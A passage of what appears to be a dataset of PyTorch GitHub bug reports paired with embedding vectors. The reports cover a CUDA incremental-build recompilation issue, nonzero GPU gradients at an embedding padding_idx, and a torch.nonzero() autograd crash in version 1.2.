  7.08532855e-02  3.09206128e-01  2.50881612e-01 -2.52155662e-01
 -8.17448795e-02  1.64385855e-01  1.80798784e-01 -9.08795744e-02
 -2.36046575e-02 -1.16787106e-01 -9.71234515e-02 -2.05904350e-01
 -1.32994503e-02 -1.20651603e-01  5.35039194e-02 -1.22432604e-01
 -3.29305977e-02 -1.53272420e-01 -5.81433326e-02  6.82281181e-02
 -1.67983785e-01 -1.39864013e-01  9.67383981e-02 -3.15420963e-02
  2.93397367e-01 -2.04416290e-01 -1.52115166e-01 -3.72299254e-01
 -2.31437892e-01  2.05009624e-01 -1.84553817e-01 -2.89817423e-01
 -1.25182597e-02 -6.60725012e-02 -1.48834735e-01  7.35564064e-03
  8.66018683e-02 -6.29066229e-02  2.89146975e-02 -2.82502510e-02
  2.69145519e-02  1.72007620e-01  2.22921986e-02 -2.11892694e-01
 -2.83055782e-01  1.40316069e-01 -9.62945893e-02 -2.05118209e-03
 -3.49228859e-01  3.52184400e-02 -6.92451745e-02 -3.84823740e-01
 -2.95594335e-04 -5.85955530e-02  3.52423042e-02 -4.59260121e-02
 -1.22785702e-01  2.96482816e-04  7.39276335e-02  2.01373190e-01
 -5.43377876e-01 -5.75187430e-02 -1.38491273e-01 -1.40442431e-01
 -1.19635552e-01  1.33591443e-01 -1.93854988e-01 -2.10933313e-02
 -3.33602667e-01 -1.46410018e-02 -1.70970410e-01 -3.82659473e-02
  3.57778758e-01 -6.78366497e-02  1.90569967e-01 -1.68426797e-01
  2.04721764e-02  4.87782992e-03  9.03147608e-02  4.40017041e-03
 -1.48116291e-01  1.53936595e-01 -1.57591656e-01  7.65099764e-01
  2.60272503e-01  2.00156212e-01 -8.05388018e-03  4.25757945e-01
 -3.11532654e-02 -6.21379614e-02 -9.34914500e-02 -1.73866823e-01
  3.33725035e-01 -1.73720986e-01  6.25676811e-02 -3.63844037e-01
  4.18645203e-01  1.22261606e-01 -1.54645756e-01 -6.29380345e-02
  2.90533662e-01  2.07880318e-01 -4.06552553e-01  1.63446754e-01
  1.56889215e-01 -2.84663796e-01  1.68811589e-01 -1.31239906e-01
 -4.51341942e-02  1.66518360e-01 -3.87003809e-01  2.39642009e-01
  5.02121687e-01 -1.68348998e-01 -8.96134153e-02  1.53011978e-01
  1.79296166e-01 -2.14277148e-01  1.33557469e-01  4.86549586e-02
  1.54066280e-01  1.63209289e-01  4.90611494e-02 -1.00236587e-01
 -5.63441068e-02 -4.72981669e-02  3.47584337e-01  1.80181712e-01
  1.55166209e-01 -2.32956961e-01  2.66157866e-01 -4.47985157e-02
 -2.28033550e-02  2.26247340e-01 -5.61711565e-02  1.62237585e-01
  1.57573149e-01  5.10777235e-01  4.56067532e-01  1.96485758e-01
 -1.70180231e-01 -2.39327326e-01 -2.19698638e-01  1.20247662e-01
  1.07627980e-01  7.70119578e-03 -2.21844226e-01 -1.80854470e-01
 -7.05522001e-02 -3.21293324e-02  1.57975089e-02 -2.24438459e-01
  1.21513121e-02 -6.13041297e-02 -9.42735970e-02 -1.68226585e-01
 -1.42712116e-01  3.70519698e-01  1.26493007e-01 -1.14646524e-01
 -1.06645674e-01 -1.77995995e-01  5.30802980e-02 -6.09523207e-02
 -1.66932166e-01 -5.17183915e-02  2.56865561e-01  3.03922564e-01
 -6.25728965e-02  6.46548271e-02  1.18204318e-02  7.66336098e-02
 -1.21368170e-01  1.40177637e-01 -9.67283547e-03  3.35633487e-01
  9.65766907e-02  5.40486397e-03 -1.24015525e-01  4.15545046e-01
 -2.68402874e-01  1.50588959e-01 -2.60319591e-01 -5.57661876e-02
  3.15611213e-01 -4.17828947e-01 -1.99119709e-02 -2.58151740e-01
  2.95104384e-01  1.32838488e-01 -2.76593387e-01  3.46899629e-01
 -3.66686247e-02  3.61486763e-01  2.30504304e-01  9.24129412e-03
 -6.41982332e-02  2.15312652e-02 -1.84937656e-01 -1.49829984e-01
  1.48085922e-01  7.24702030e-02 -1.14569202e-01  1.08476378e-01]"
"When CUDA is enabled, recompiling after editing aten/src/ATen/core/dispatch/DispatchTable.h doesn't result in all necessary files getting recompiled high priority module: build triaged internals","Other files may also be susceptible, but the issue reproduces 100% on `aten/src/ATen/core/dispatch/DispatchTable.h`

Steps to reproduce:
1. Build PyTorch `python setup.py develop`
2. Edit the ""Didn't find kernel to dispatch to"" error message to insert some string. Example diff:

```
diff --git a/aten/src/ATen/core/dispatch/DispatchTable.h b/aten/src/ATen/core/dispatch/DispatchTable.h
index 7b4af315f1..3a5879cbda 100644
--- a/aten/src/ATen/core/dispatch/DispatchTable.h
+++ b/aten/src/ATen/core/dispatch/DispatchTable.h
@@ -263,7 +263,7 @@ private:
       }
 
       const std::string dispatch_key_str = dispatch_key.has_value() ? toString(*dispatch_key) : ""None"";
-      TORCH_CHECK(false, ""Didn't find kernel to dispatch to for operator '"", operator_name_,
+      TORCH_CHECK(false, ""ARGLEBARGLEFARR Didn't find kernel to dispatch to for operator '"", operator_name_,
                ""'. Tried to look up kernel for dispatch key '"", dispatch_key_str,
                ""'. Registered dispatch keys are: "", listAllDispatchKeys());
   }
```

3. Rebuild PyTorch `python setup.py develop`
4. Run `python -c ""import torch; torch.cat([], dim=1)`

Expected result: you see ARGLEBARGLEFARR
Actual result: you don't see it

I did an experiment where I did one of these botched recompiles, and then compared the set of files which had ARGLEBARGLEFARR with the set of files that had the normal error message. What I found is that CUDA generated files had not been recompiled, but CPU (and final library) all had the string. The fact that the CUDA files are not recompiling seems problematic; however, I don't understand how this could have caused the problem, as the test I made above is CPU (perhaps some sort of weak symbol situation?)

cc @ezyang @gchanan @zou3519 @smessmer ",True,"[-3.59901011e-01 -4.45604265e-01 -3.35927308e-01  1.85597122e-01
  1.53929479e-02 -1.57018870e-01 -2.68099576e-01  2.59060264e-02
 -4.81942773e-01  3.14024538e-02 -1.10216558e-01  9.88243446e-02
 -4.45923023e-02 -4.06051576e-02 -1.39463782e-01  9.35915038e-02
  1.73460335e-01 -1.67279601e-01  5.01452573e-02 -1.61479667e-01
 -1.43166676e-01  2.82342702e-01  2.24703718e-02 -1.25957668e-01
  2.56094545e-01 -1.25512898e-01 -6.95879757e-02 -1.67513713e-01
  1.55927420e-01 -7.97889754e-02  1.38272226e-01  1.01183251e-01
 -5.57419658e-02  4.31862660e-02  7.46367574e-02  8.57443064e-02
 -1.65551484e-01 -2.47666076e-01  1.22912169e-01 -2.19917461e-01
 -2.06656888e-01 -9.95293483e-02 -1.63487241e-01 -1.44029319e-01
 -2.49229535e-01 -2.73960352e-01  1.52904302e-01  2.80443221e-01
 -1.99568421e-01 -1.43410772e-01 -1.15736164e-01  1.98481828e-01
 -1.67637086e-03 -3.97514343e-01  1.42693222e-01  4.21533659e-02
  2.35833004e-02  2.87893385e-01 -6.71091303e-02 -8.73971656e-02
 -3.28084640e-02 -1.32468387e-01  1.90776497e-01 -5.34499958e-02
  1.64223999e-01  1.50833338e-01  4.63602617e-02 -8.71462822e-02
  3.39879125e-01  1.22927316e-02 -4.84483577e-02  5.95420152e-02
 -3.47212434e-01 -2.85864919e-01  2.77583487e-02  3.53521079e-01
 -2.55214870e-01 -1.70164816e-02 -3.44178565e-02 -1.57972082e-01
 -2.47007422e-02  3.25021029e-01  5.61645702e-02 -7.16591105e-02
  1.13891177e-01 -1.67755514e-01  2.44664624e-01 -5.72026568e-03
 -2.68639680e-02  1.65409490e-01  3.78992200e-01 -1.69354022e-01
  1.22268289e-01  1.29810274e-01 -2.18470991e-02  2.14368761e-01
 -1.70449317e-01  2.95231435e-02 -3.09692353e-01 -3.53115231e-01
 -1.37228072e-01 -3.08954537e-01 -5.22576869e-01  3.88433754e-01
 -7.57081434e-02 -1.25323027e-01  4.95628491e-02  6.98400885e-02
 -9.05082673e-02 -9.99536291e-02  2.66322464e-01  2.98763569e-02
  1.37466371e-01 -5.75599298e-02  1.22187316e-01  1.87254041e-01
 -3.24712098e-02 -1.32612810e-01  7.53379762e-02 -8.89918506e-02
  4.35917005e-02 -1.72727466e-01  4.94813584e-02  6.37496188e-02
  2.97137439e-01  2.14013197e-02  1.59285173e-01 -4.72580753e-02
  1.05239466e-01 -3.80712450e-02  9.50312763e-02  3.33434492e-02
  3.51428032e-01 -5.94092086e-02  1.26948759e-01  1.18306324e-01
 -1.39232174e-01 -2.92033583e-01 -2.06644207e-01  7.15590268e-02
  1.03069916e-01 -4.59078029e-02 -1.33643106e-01 -1.39337331e-01
  7.72435665e-02  2.53639698e-01 -1.25853911e-01  2.23448783e-01
  1.42240614e-01  1.36531249e-01 -5.72041795e-03  4.02078219e-03
 -4.58276421e-01  2.97135442e-01  5.43943122e-02  2.61395693e-01
  7.40901902e-02 -1.54823571e-01 -5.45731187e-03 -2.73128629e-01
  3.96167114e-02  4.10883099e-01 -1.02315381e-01  5.91461807e-02
 -1.25488281e-01  1.97249219e-01 -1.04339898e-01 -8.76725912e-02
 -9.89853367e-02  9.02554244e-02 -4.10632789e-01 -1.04102872e-01
  2.35522851e-01 -3.45038414e-01  1.94352970e-01  7.40620792e-02
 -2.34502271e-01 -2.21770570e-01  1.97056115e-01  3.19169611e-01
  2.50066936e-01  3.22260112e-01  1.35556385e-01  2.72540376e-04
  1.79688990e-01  8.69478360e-02  5.89111984e-01  1.08258605e-01
 -3.13119829e-01  3.99337150e-02 -3.17276120e-01  1.69679880e-01
 -8.71450305e-02  2.31855959e-02 -2.28265487e-02 -1.85457826e-01
  1.25414461e-01  1.99181348e-01  3.26666683e-01  1.84944272e-02
 -9.11760256e-02  1.05524905e-01  2.44573243e-02  1.06558114e-01
 -1.64991915e-02 -2.67404437e-01 -4.18817967e-01 -1.63851589e-01
  1.13395303e-02  2.18306165e-02 -3.62697482e-01 -2.69632518e-01
  6.27312064e-02 -1.57900423e-01 -4.15474057e-01  4.00363833e-01
  3.66537943e-02  8.20474252e-02  3.63839507e-01 -3.93746942e-02
  3.39365542e-01 -2.68072188e-01  3.70103717e-01 -2.62863278e-01
  3.77889156e-01 -4.60583717e-02 -4.20892015e-02 -1.71468258e-01
  1.14418447e-01  4.10229452e-02 -1.38147205e-01 -1.90058276e-01
  1.49466932e-01 -1.39527038e-01 -7.69803673e-02  3.78437638e-02
  2.06984967e-01 -1.48963630e-01  1.96577050e-02  3.65827978e-01
 -3.67290318e-01 -1.24866944e-02 -1.22696280e-01 -3.64577770e-02
  4.36220020e-02  5.93540221e-02 -6.44918308e-02  3.49778771e-01
 -3.09851110e-01 -1.37591302e-01 -1.82051361e-01 -1.57221660e-01
  1.86376274e-01  9.97804254e-02  9.46657807e-02 -1.36430323e-01
 -1.42016917e-01  9.84495133e-02  5.50323874e-02  5.62059954e-02
  8.84663984e-02  3.17949414e-01 -8.72984678e-02  3.64311278e-01
  2.31437325e-01  7.87553787e-02 -3.13018620e-01  3.51619333e-01
 -2.68610895e-01 -1.15723938e-01 -4.79950458e-02 -1.93583608e-01
  2.91455984e-01 -9.20484513e-02  3.10495555e-01  1.30667999e-01
  5.91802299e-01 -3.49002741e-02  2.13668987e-01  1.56595588e-01
  2.80787259e-01  1.60233632e-01 -3.86263169e-02  2.09476113e-01
  1.31899402e-01 -2.05539390e-01 -8.70588347e-02 -3.67078394e-01
 -2.47541830e-01 -2.16332078e-01 -2.88453639e-01  1.59843981e-01
  1.68410227e-01 -1.15833558e-01 -1.38790339e-01  8.38820338e-02
  2.85364985e-01 -2.08995014e-01  1.01910196e-01 -2.03982502e-01
 -4.19410229e-01  6.40295446e-02 -3.70245352e-02  8.08864981e-02
 -2.59114265e-01 -9.68357623e-02  1.38313413e-01  1.26598924e-01
  1.63746312e-01 -4.28687125e-01  4.12970424e-01  2.21583247e-01
  1.15650721e-01  3.89362037e-01 -1.47177070e-01  1.17406324e-01
  1.54597327e-01  4.10640717e-01  1.60819501e-01  5.36272302e-02
 -2.42953584e-01 -2.37556830e-01 -1.21022016e-01  6.71614856e-02
  2.58330703e-01  2.41329089e-01 -1.10586874e-01  8.62165689e-02
 -6.45708293e-03  1.28250644e-01  1.59437478e-01  1.33296043e-01
 -5.39766327e-02  1.40452296e-01  6.05291501e-03  1.98348880e-01
  6.69506267e-02  8.81183371e-02 -1.25033394e-01 -1.62623644e-01
  2.53782701e-03 -7.13939741e-02 -5.92680648e-02 -1.39017478e-01
 -7.22196773e-02 -1.29474802e-02  1.73362747e-01  2.84471452e-01
 -1.33536667e-01 -7.57488608e-02 -8.42326060e-02 -7.25284666e-02
 -2.35792592e-01 -1.26653895e-01  2.23268084e-02  2.29661405e-01
  2.79559910e-01  1.10149018e-01 -1.34974688e-01 -5.84929585e-02
 -6.71791434e-01  3.36962432e-01 -1.47207379e-01 -6.48777783e-02
 -7.92449191e-02 -2.25984797e-01 -5.54747820e-01 -6.13867678e-02
  1.54451411e-02 -2.50730067e-02 -1.85446665e-01  2.08800882e-01
 -1.37782589e-01  2.50327289e-01  3.15689027e-01  4.83488366e-02
 -1.59448966e-01  1.54776633e-01  3.75875354e-01 -1.15672862e-02
  4.31658477e-02  3.77234936e-01  2.61815310e-01 -1.60423905e-01]"
Gradient for embedding vector at padding_idx is not zero when on GPU high priority module: autograd triaged,"## ðŸ› Bug
Backward passes generate nonzero gradients for the embedding vector at the `padding_idx` index. Only occurs on the GPU, and didn't occur as of version 1.0.1.post2. 

## To Reproduce

```
import torch
dev = torch.device('cuda')
torch.manual_seed(0)

random_ix = torch.randint(high=10, size=(256, 3, 7))
embedding_layer = torch.nn.Embedding(10, 5, padding_idx=0)

embedding_layer.to(dev)
random_ix = random_ix.to(dev)

embeds = embedding_layer(random_ix)
merged = torch.sum(embeds, dim=2)
summed = merged.sum()
summed.backward()

print(embedding_layer.weight.grad[0])
```
which outputs: `tensor([505., 505., 505., 505., 505.], device='cuda:0')`

## Expected behavior
`tensor([0., 0., 0., 0., 0.], device='cuda:0')`

Running on the CPU provides the expected behavior:

```
torch.manual_seed(0)

random_ix = torch.randint(high=10, size=(256, 3, 7))
embedding_layer = torch.nn.Embedding(10, 5, padding_idx=0)

embeds = embedding_layer(random_ix)
merged = torch.sum(embeds, dim=2)
summed = merged.sum()
summed.backward()

print(embedding_layer.weight.grad[0])
```

## Environment

 - PyTorch Version: 1.2
 - OS: Ubuntu 18.04.2 LTS
 - How you installed PyTorch: pipenv
 - Python version: 3.6.7
 - CUDA/cuDNN version: 10.0
 - GPU models and configuration: GeForce RTX 2080 Ti


cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen",True,"[-2.31181666e-01  1.11199670e-01 -2.97111332e-01 -1.77397236e-01
  1.82928339e-01 -1.54902101e-01 -3.67323995e-01  1.80698052e-01
 -4.07696128e-01  1.20103471e-02 -1.90644458e-01  6.43549040e-02
  8.26021880e-02  2.00605989e-01 -3.08131307e-01  2.19520390e-01
 -3.36523116e-01  1.27507135e-01  1.98521763e-02 -8.45093429e-02
  1.11791790e-01 -1.35905683e-01 -7.34868925e-03  5.59391920e-03
  7.98506290e-02  7.42758065e-02 -1.47635236e-01 -5.43059371e-02
  2.86956072e-01 -1.93889678e-01  1.67023733e-01 -7.41773993e-02
 -1.47180662e-01  8.62565935e-02 -3.69010642e-02 -2.68972099e-01
 -2.17646897e-01 -2.60646552e-01 -3.02281827e-01  5.55452853e-02
  2.84077395e-02  2.20676929e-01 -5.22832572e-02  9.95151401e-02
  1.21928960e-01 -1.07785344e-01 -2.38194950e-02  7.64232725e-02
 -4.90412861e-02 -1.17783308e-01  8.74864757e-02  2.38620043e-01
 -2.22325757e-01 -3.55342865e-01 -2.70505637e-01  3.95978875e-02
 -1.54066328e-02 -3.05829227e-01  1.99543864e-01 -2.31842339e-01
  6.70311302e-02  1.66412964e-01  1.46259248e-01  1.73947528e-01
 -1.38108373e-01 -2.89047640e-02 -1.22571006e-01  2.89555769e-02
  3.33957404e-01  6.52244538e-02  1.68036163e-01 -1.66843116e-01
 -3.30677807e-01 -1.21368930e-01  1.60412818e-01  8.60260986e-03
 -2.70445436e-01  2.14531839e-01 -1.72933489e-01 -2.48629361e-01
  1.53677449e-01  1.71669394e-01 -1.12647504e-01 -4.78628650e-02
  8.29752386e-02 -3.64809558e-02  5.40905714e-01 -2.11801648e-01
  5.23109198e-01  2.60658592e-01  1.57719031e-01  4.21672314e-02
 -4.59866256e-01  1.84379160e-01  1.61857098e-01 -2.62241140e-02
  1.11687891e-01 -2.81654149e-01 -1.54219657e-01 -1.22187339e-01
 -2.06381768e-01 -1.78563327e-01 -2.36072809e-01  2.14338288e-01
  1.59959570e-01  1.22039706e-01  8.93332064e-02  1.58577219e-01
  2.16571659e-01  3.79676744e-02  2.68138647e-01  9.95067433e-02
 -1.22511774e-01 -6.57970160e-02 -7.64289945e-02 -1.29403502e-01
 -1.24852784e-01 -1.82194769e-01 -9.18919668e-02  3.09335738e-01
 -2.00113803e-01  5.47466148e-03 -1.16366670e-01  3.48780096e-01
  4.54794049e-01 -1.14638552e-01 -1.00483507e-01 -5.96850030e-02
 -2.30284147e-02 -2.87060142e-01  1.79669410e-01  1.60499923e-02
  8.74708295e-02 -1.32915586e-01  2.34727383e-01  9.09231827e-02
 -3.54269981e-01  6.90825880e-02 -3.45144808e-01 -8.70162994e-02
 -3.40865970e-01  2.09872469e-01 -2.62869149e-01 -3.12311649e-01
  9.72528085e-02  3.67883593e-02 -3.96397501e-01  4.66650873e-02
 -8.25275034e-02 -1.43806070e-01 -1.92406774e-01 -3.42350751e-01
 -5.68685651e-01  2.60784328e-01  3.53389949e-01  2.03243271e-01
  3.07012022e-01  3.48120406e-02  6.27745017e-02 -4.63380784e-01
  1.99251652e-01  1.48044780e-01  1.55880094e-01  8.53486657e-02
  4.62041497e-01  1.58262759e-01 -1.12023413e-01  3.65374446e-01
 -2.49261424e-01  2.89786816e-01  2.90263057e-01 -4.57527395e-03
 -2.47668773e-01  1.12181362e-02  6.79179192e-01 -2.77051508e-01
 -2.48481721e-01 -4.19244766e-01 -1.23468317e-01  2.79773265e-01
  3.71256053e-01  1.21612877e-01  2.74363309e-01 -7.35506117e-02
 -3.92900482e-02  6.98928982e-02  1.83259919e-01 -1.60914689e-01
 -4.34249043e-01 -6.16175979e-02 -1.63520277e-01 -4.51586574e-01
  1.56576321e-01 -1.13663506e-02 -5.91249615e-02  1.72137260e-01
  4.23228368e-02  9.20826644e-02 -7.04827718e-03 -6.34865463e-02
 -1.23252697e-01 -4.29882050e-01  4.26599011e-02  2.34124780e-01
  8.25355500e-02  4.90562171e-02 -1.63313836e-01 -2.09705770e-01
 -5.01314759e-01  1.79235190e-01 -1.52553171e-01 -3.78954977e-01
  9.82493907e-02 -1.62020594e-01 -6.49279281e-02  2.04946235e-01
 -1.85438357e-02 -1.30195946e-01 -5.44501469e-02  1.15160450e-01
  5.22728026e-01  1.09380580e-01 -1.92919552e-01 -9.43543315e-02
 -2.69344032e-01 -9.21589211e-02 -1.69187754e-01  8.45471025e-02
 -2.02930480e-01  1.37593925e-01 -1.13305002e-01 -1.56204745e-01
  8.94321874e-03 -1.01983294e-01 -1.20229855e-01  4.95305389e-01
  1.28005058e-01 -1.65576696e-01  4.31938097e-02 -1.66919082e-03
  7.72838481e-03  3.37515980e-01  2.31112540e-02 -9.76300836e-02
  1.23865247e-01  4.13033545e-01 -2.81574488e-01  8.74879509e-02
 -1.08033821e-01  1.16398290e-01  4.95721288e-02  2.18554080e-01
 -2.87170298e-02 -1.91420943e-01  2.40706429e-01 -2.05126964e-02
 -1.04623295e-01 -3.28929164e-04  1.47561720e-02  7.47577474e-02
  6.56025037e-02  1.64658770e-01 -7.76529163e-02  5.56032896e-01
  2.07560286e-01 -1.87284220e-02 -2.54996300e-01  7.21261501e-02
 -7.30378255e-02 -2.12766841e-01 -1.05586819e-01 -8.75668004e-02
  6.22184515e-01  1.89278156e-01  5.54361418e-02 -1.64393652e-02
  3.37047935e-01 -1.15696639e-02 -7.76296034e-02 -2.59564012e-01
 -1.67076319e-01  3.10093313e-01  1.66508295e-02  4.54744935e-01
  1.37313664e-01 -2.02726692e-01  3.56732681e-02 -2.38805726e-01
 -9.39286053e-02  8.76915306e-02 -1.31995350e-01 -7.82277286e-02
  2.48271823e-01  4.16316045e-03 -1.10129938e-01  1.96960539e-01
  2.29424983e-01 -2.07112581e-02  1.54775567e-04 -1.25864759e-01
  1.97266296e-01  3.04748893e-01  3.57583046e-01 -2.92653203e-01
 -1.32348061e-01 -1.62876770e-01  1.62708506e-01  9.37623829e-02
  2.91651726e-01 -3.38979661e-01  1.35575607e-03 -4.34518382e-02
 -1.13000736e-01  3.02387267e-01 -1.39214739e-01  2.49569267e-01
  4.36810628e-02  2.26019785e-01 -1.31901056e-01  6.90940097e-02
 -8.36825520e-02 -5.84053732e-02 -8.33481699e-02  3.45323682e-01
 -8.33287649e-03  3.16115141e-01 -2.65795052e-01 -1.21662673e-02
  1.37184085e-02 -1.42133132e-01  3.71597797e-01 -1.51313856e-01
  9.66588855e-02  1.24933548e-01  6.43630400e-02 -2.67713189e-01
 -1.41661763e-01  2.65612543e-01  5.52282631e-02 -4.68772829e-01
 -1.49991632e-01 -9.91309583e-02  3.27483490e-02 -2.68907607e-01
 -9.98152494e-02 -7.55400807e-02  1.25440061e-01  3.87490481e-01
  1.58981591e-01 -1.16552226e-01  5.97822331e-02 -1.90444048e-02
 -1.61006510e-01  3.38208258e-01  7.13494420e-02  4.13625240e-01
  1.85889125e-01  8.67969692e-02 -1.00708723e-01  3.58850479e-01
 -1.34954929e-01 -9.48212519e-02 -2.91667223e-01 -3.41440678e-01
 -2.99574435e-01 -1.86971650e-02  6.64294735e-02  1.02368943e-01
  8.71653110e-02  2.98279405e-01  1.68824881e-01  3.19929793e-02
 -3.80554236e-02  3.74159396e-01  3.12756985e-01 -3.60098809e-01
  1.88767910e-02 -1.27483338e-01  1.01358242e-01 -8.05354677e-03
 -9.16412026e-02  1.25595629e-01 -3.63023251e-01 -6.61690608e-02]"
Torch.nonzero() leads to crash in PyTorch 1.2 high priority module: autograd triaged,"The code snippet works fine in 1.1 but causes an error in 1.2:
> p = F.softmax(x, dim=1)
> m = y != self.ignore_index
> t = F.one_hot((y * m.byte()).long(), num_classes=self.num_classes).byte().permute(0,3,1,2)
> i = (p * (t * m.unsqueeze(1).byte()).float()).sum((0,2,3))
> u = ((p + t.float()) * m.unsqueeze(1).float()).sum((0,2,3)) - i
> v = u.nonzero()
> return -((i[v] / u[v]).mean()).log()

I get the error message below:

> RuntimeError: range.second - range.first == t.size() INTERNAL ASSERT FAILED at /pytorch/torch/csrc/autograd/generated/Functions.cpp:55, please report a bug to PyTorch. inconsistent range for TensorList output

I had to remove the usage of nonzero() like below to make the code work:
> p = F.softmax(x, dim=1)
> m = y != self.ignore_index
> t = F.one_hot((y * m.byte()).long(), num_classes=self.num_classes).byte().permute(0,3,1,2)
> i = (p * (t * m.unsqueeze(1).byte()).float()).sum((0,2,3))
> u = ((p + t.float()) * m.unsqueeze(1).float()).sum((0,2,3)) - i
> return -((i / u).mean()).log() 

I have two questions:
(1) Why does the runtime error happen in 1.2 but not in 1.1?
(2) By not using nonzero to prevent division by zero I have numeric instability in theory. However, in really the number that comes out from a softmax operation should not reach zero because the input can't really reach negative infinity right?

cc @ezyang @gchanan @zou3519 @SsnL @albanD",True,"[-3.82326245e-01  8.40778649e-02 -2.61259854e-01  4.55854386e-02
 -5.38669154e-02 -1.98817804e-01  1.43219411e-01  1.39788687e-01
 -3.71541172e-01 -8.39067698e-02 -3.95765714e-02 -4.48804535e-02
  5.01397699e-02  1.89369798e-01  4.36655208e-02  4.93337661e-02
 -1.54173240e-01 -5.14638066e-01  3.31638940e-02 -7.20258132e-02
  3.57205868e-01 -7.01657236e-02 -9.39190611e-02 -3.58517952e-02
 -1.83737636e-01  1.19524270e-01 -2.65381694e-01 -3.65447626e-02
  1.34647012e-01  5.54864965e-02  1.27750868e-02 -1.05113909e-03
 -2.15819597e-01 -1.17918588e-02  3.41557741e-01  1.02715276e-01
 -4.67781313e-02 -2.48199835e-01 -1.96208760e-01  7.48217702e-02
  9.55364704e-02  2.08910093e-01  1.36822715e-01 -3.36926132e-02
 -5.43358326e-02 -1.02148019e-01 -6.90288618e-02  1.57942146e-01
 -2.44586602e-01 -2.18106762e-01 -1.54908434e-01  2.65577257e-01
 -2.10249990e-01 -1.31301939e-01  8.14000890e-02 -3.15697268e-02
  3.15521359e-02 -9.69569478e-03 -7.15964362e-02 -3.78279924e-01
  2.17302382e-01 -2.95616053e-02 -6.19202591e-02  1.37400150e-01
  1.95710778e-01  4.72373851e-02 -5.71420416e-03 -1.76643461e-01
  4.32058871e-01 -5.85673936e-02 -4.65765446e-02 -6.54568374e-02
 -3.70932639e-01 -1.73070908e-01  4.74030524e-03 -1.08466856e-02
 -3.31728429e-01  2.12347642e-01 -9.59812850e-03 -1.23274520e-01
 -7.77127966e-02 -1.91458583e-01  4.13690414e-03 -2.48275608e-01
 -9.61126387e-02  1.30902901e-01  2.57994235e-01 -5.74335605e-02
  4.57408100e-01  1.88110709e-01  3.49193662e-01 -6.47790432e-02
  7.38585591e-02  4.87712502e-01  8.74941647e-02  1.95334584e-01
  1.72353417e-01 -2.54167050e-01 -5.22185378e-02 -3.66302952e-02
 -1.74862128e-02 -5.42673707e-01 -3.27970892e-01  3.17169845e-01
  8.72525424e-02 -1.56595744e-02  1.21223867e-01  4.39796865e-01
  1.66545436e-01 -4.13931981e-02  2.38309458e-01  1.93019241e-01
  1.29280955e-01  1.23100758e-01  6.57081604e-02 -2.75584072e-01
 -7.52860904e-02  9.23204869e-02 -3.32848169e-04  1.74662799e-01
  1.37856543e-01  3.82389352e-02 -5.18588163e-03  2.28602558e-01
  3.72888297e-01  1.04773588e-01  5.16687185e-02  8.91795382e-03
  1.35815054e-01  1.41945034e-02  7.00136423e-02 -3.24982032e-02
 -2.16304392e-01 -5.89952283e-02  3.15352857e-01  3.29073012e-01
 -2.61160880e-01 -8.64966810e-02  1.16480961e-01  1.94249809e-01
 -2.42307112e-01  5.50566614e-03  6.35208637e-02 -1.10178545e-01
 -1.32946391e-03  1.58549190e-01 -2.42256880e-01  1.59862608e-01
 -9.77216754e-03  4.88825291e-02 -6.43961504e-02 -2.55921483e-01
 -3.24709147e-01  1.88149795e-01  7.16572162e-03 -6.25630468e-02
  1.68471828e-01  9.72794555e-03  3.30739319e-01 -2.14798063e-01
 -1.14034921e-01  2.70985305e-01 -1.10325217e-02  2.10749935e-02
  1.21697731e-01  1.69480309e-01 -1.37587264e-01 -1.11203402e-01
 -5.05053222e-01  4.14307490e-02  2.95121707e-02 -1.93980247e-01
 -1.09559223e-01 -3.80715311e-01  1.74920768e-01  3.53266019e-03
 -7.94305056e-02 -1.70845807e-01 -2.43714839e-01  2.07843781e-01
  1.29941463e-01  4.14090037e-01  2.15992153e-01  1.92925736e-01
  2.65371740e-01  1.73519120e-01  2.73647368e-01  3.28282416e-02
 -1.33153409e-01 -1.87288761e-01 -3.10059011e-01 -3.20023596e-01
  2.52186954e-01  9.00406856e-03 -9.05094370e-02 -9.65497270e-02
  3.74476798e-02 -1.32424623e-01  8.16633925e-02 -3.49503160e-02
 -5.13539538e-02 -1.61051646e-01  1.63944140e-01 -1.66807085e-01
  3.32830906e-01  6.88872635e-02 -4.47284460e-01 -2.75483072e-01
 -1.34315968e-01  1.96784377e-01 -3.46657097e-01 -3.64437968e-01
 -2.50362992e-01 -2.34395549e-01 -1.93153590e-01 -8.81785750e-02
  8.03117361e-03 -8.99484754e-02 -1.92722268e-02  2.25089177e-01
  2.73393780e-01 -3.46365683e-02 -2.42976010e-01 -3.36527109e-01
 -6.48683980e-02 -2.15030815e-02 -1.52417794e-01  5.94724268e-02
 -1.85749345e-02 -2.30233431e-01 -2.06778735e-01 -3.20321649e-01
  3.24287832e-01  1.69382125e-01 -1.81692056e-02  4.71954674e-01
  5.70115112e-02  1.06305461e-02 -3.30902170e-03 -5.84495068e-02
  6.14167526e-02 -1.97213545e-01  9.75847617e-02 -1.67048842e-01
 -2.79716909e-01  8.21012855e-02 -3.84072304e-01 -1.51635692e-01
 -2.31715262e-01  8.95760357e-02 -3.39872360e-01  1.22384124e-01
 -7.81735703e-02 -1.24552399e-01  3.43117416e-01 -3.15179154e-02
 -7.68504478e-03 -3.10327947e-01  4.07200158e-02 -7.11272433e-02
  1.50481965e-02  1.98075891e-01 -9.51947644e-03  4.37802553e-01
  1.79653481e-01  4.10018601e-02  4.69618142e-02 -4.64766026e-02
 -8.67783651e-02 -9.23388973e-02  1.28860965e-01 -4.26722825e-01
  2.73172617e-01  2.62617707e-01  4.98365834e-02 -1.18428089e-01
  2.05344558e-01 -1.75124541e-01 -1.92928910e-01 -1.02499433e-01
  1.80699036e-01  4.59235996e-01 -2.81966567e-01  3.67591046e-02
  4.24210519e-01 -1.17246225e-01  3.09187844e-02  4.41770256e-02
 -1.82963550e-01 -2.97614932e-01 -1.47876292e-01  2.96812773e-01
  4.90480661e-01 -4.57829759e-02 -7.62545764e-02  2.57609069e-01
  2.44910315e-01 -2.66892880e-01  1.36265159e-01 -5.32779060e-02
  4.23651263e-02 -8.35664570e-03  2.44684756e-01 -1.73958406e-01
 -2.07801759e-01  3.49601746e-01  1.69559792e-01 -1.21430680e-02
  3.28888774e-01 -2.77479768e-01  4.69842762e-01  6.16800077e-02
 -1.61769688e-01  2.40358755e-01 -1.19030029e-01  6.56756386e-02
 -1.88679606e-01  3.26912820e-01  3.28157783e-01  1.26487955e-01
 -8.41613486e-02 -2.02688962e-01 -2.05821872e-01  3.82651806e-01
  2.72596985e-01 -3.67956311e-02 -3.35514724e-01 -1.63403496e-01
 -1.06820203e-02  6.64045364e-02  1.68905765e-01 -1.04943581e-01
  1.18025281e-01  1.40014654e-02  2.85714716e-02 -1.63389325e-01
